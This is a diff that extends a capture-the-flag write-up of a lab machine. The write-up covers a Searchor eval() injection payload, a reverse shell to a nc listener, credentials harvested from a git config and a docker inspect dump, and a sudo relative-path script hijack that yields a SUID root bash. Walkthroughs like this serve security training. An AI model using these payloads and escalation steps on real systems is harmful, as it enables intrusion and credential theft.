@@ -23,8 +23,12 @@ nmap -p 22,80 -sCV 10.129.48.49
 Two ports.
 
 ```
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (protocol 2.0)
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
 80/tcp open  http    Apache httpd 2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
 ```
 
 Port 80 redirected to `http://searcher.htb`, so into `/etc/hosts` it went:
@@ -43,7 +47,7 @@ The site is a search-URL generator. The footer and the page advertised the stack
 
 ### Searchor 2.4.0 eval() injection
 
-Searchor `<= 2.4.0` builds its URL by `eval`-ing a string with the query inlined (SNYK-PYTHON-SEARCHOR-3166303). The vulnerable line:
+Searchor `<= 2.4.0` builds its URL by `eval`-ing a string with the query inlined (SNYK-PYTHON-SEARCHOR-3166303, CVE-2023-43364). The vulnerable line:
 
 ```python
 url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
@@ -65,6 +69,25 @@ Content-Type: application/x-www-form-urlencoded
 engine=BBC&query=http%3a//127.0.0.1/'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("id")','a','single'))%2b'&auto_redirect=
 ```
 
+The reason it fires: the deployed `app.py` passes my raw `query` straight to the Searchor CLI, which is the wrapper around the vulnerable `eval`. Once I had a shell I pulled the app source and confirmed the route:
+
+```python
+@app.route('/search', methods=['POST'])
+def search():
+    try:
+        engine = request.form.get('engine')
+        query = request.form.get('query')
+        auto_redirect = request.form.get('auto_redirect')
+
+        if engine in Engine.__members__.keys():
+            arg_list = ['searchor', 'search', engine, query]
+            r = subprocess.run(arg_list, capture_output=True)
+            url = r.stdout.strip().decode()
+            ...
+```
+
+`engine` is gated to the enum members, but `query` is not, so it flows untouched into `searchor search`, which is where the `eval` lives.
+
 That executed `id` server-side. Swapping `id` for a reverse shell over the same structure landed a shell as `svc` (I had a `nc` listener on 3333):
 
 ```
@@ -80,7 +103,30 @@ A simpler one-liner breakout also works if you prefer it: `query=' + __import__(
 
 ## user
 
-As svc I looked at the app directory and found a Gitea checkout under `/var/www/app/.git`. The remote URL in its config embedded credentials:
+First thing as svc was to map what Apache was fronting. `netstat` showed a stack of loopback-only services that never showed up on the external scan:
+
+```
+tcp  0  0 127.0.0.1:3306   0.0.0.0:*  LISTEN  -            # mysql
+tcp  0  0 127.0.0.1:222    0.0.0.0:*  LISTEN  -            # gitea ssh
+tcp  0  0 127.0.0.1:3000   0.0.0.0:*  LISTEN  -            # gitea web
+tcp  0  0 127.0.0.1:5000   0.0.0.0:*  LISTEN  1523/python3 # the flask app
+```
+
+The Apache vhost config explained the routing. Port 80 reverse-proxies the Flask app on `:5000`, and a second `gitea.searcher.htb` vhost proxies Gitea on `:3000`:
+
+```
+<VirtualHost *:80>
+        ServerName searcher.htb
+        ProxyPass / http://127.0.0.1:5000/
+        ...
+<VirtualHost *:80>
+        ServerName gitea.searcher.htb
+        ProxyPass / http://127.0.0.1:3000/
+```
+
+So I added `gitea.searcher.htb` to `/etc/hosts` and had a Gitea instance to look at. The running version (`/version` returned `1.18.0+rc1`) is past the CVE-2019-11229 mirror-config RCE, so the authenticated-RCE route was a dead end here. The way in was simpler.
+
+Looking at the app directory I found a Gitea checkout under `/var/www/app/.git`. The remote URL in its config embedded credentials:
 
 ```ini
 [remote "origin"]
@@ -139,7 +185,9 @@ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Con
        "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea", ...]
 ```
 
-The `MYSQL_PASSWORD` (`yuiu1hoiu4i5ho1uh`) was reused as the Gitea **administrator** web password. I tunnelled or added `gitea.searcher.htb` to hosts, logged in as `administrator:yuiu1hoiu4i5ho1uh`, and that exposed the private `scripts` repository holding the source of `system-checkup.py`. Reading the source confirmed exactly how the third action runs.
+The full `.Config` dump also leaked the compose project path in its labels (`com.docker.compose.project.working_dir=/root/scripts/docker`), which placed the script tree under root's home.
+
+The `MYSQL_PASSWORD` (`yuiu1hoiu4i5ho1uh`) was reused as the Gitea **administrator** web password. Logged in as `administrator:yuiu1hoiu4i5ho1uh`, the private `scripts` repository at `/administrator/scripts` exposed the source of both `system-checkup.py` and `full-checkup.sh`. Reading the source confirmed exactly how the third action runs.
 
 ### the relative-path bug
 
@@ -156,7 +204,20 @@ elif action == 'full-checkup':
         exit(1)
 ```
 
-`run_command` is `subprocess.run(arg_list, ...)`, so `./full-checkup.sh` resolves against the current working directory. The script runs as root because the whole thing runs under sudo, so whatever `full-checkup.sh` sits in my CWD is what root executes. That is why it failed from `/opt/scripts` (no such script there) and is the entire vulnerability.
+`run_command` is `subprocess.run(arg_list, ...)`, so `./full-checkup.sh` resolves against the current working directory. The real `full-checkup.sh` in the repo is harmless on its own, it just pings the docker containers and the webhosts and dumps the PM2 process list:
+
+```bash
+#!/bin/bash
+/usr/bin/echo '[=] Docker conteainers'
+/usr/bin/docker ps -s -q | /usr/bin/xargs ... inspect ...
+/usr/bin/echo '[=] Apache webhosts'
+/usr/bin/wget http://searcher.htb/ -T 3 -O /dev/null -q
+...
+/usr/bin/echo '[=] PM2 processes'
+/usr/local/bin/pm2 list
+```
+
+The content does not matter though. The script runs as root because the whole thing runs under sudo, and it is invoked by relative path, so whatever `full-checkup.sh` sits in my CWD is what root executes. That is why it failed from `/opt/scripts` (no such script there) and is the entire vulnerability.
 
 ### exploiting it
 
@@ -169,11 +230,18 @@ chmod +x full-checkup.sh
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
 ```
 
-Root ran my script, `/bin/bash` picked up the SUID bit, and `bash -p` kept the root euid:
+Root ran the script (the tell is the PM2 table printing under sudo, which only root could produce from that working dir), `/bin/bash` picked up the SUID bit, and `bash -p` kept the root euid:
 
-```bash
-bash -p
-# id -> euid=0(root); cat /root/root.txt
+```text
+svc@busqueda:~/temp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+...
+[=] PM2 processes
+│ 0 │ app │ default │ N/A │ fork │ 1523 │ 23h │ 0 │ online │ ... │ svc │
+[+] Done!
+svc@busqueda:~/temp$ /bin/bash -p
+bash-5.1# id
+uid=1000(svc) gid=1000(svc) euid=0(root) ...
+bash-5.1# cat /root/root.txt
 ```
 
 ## takeaway
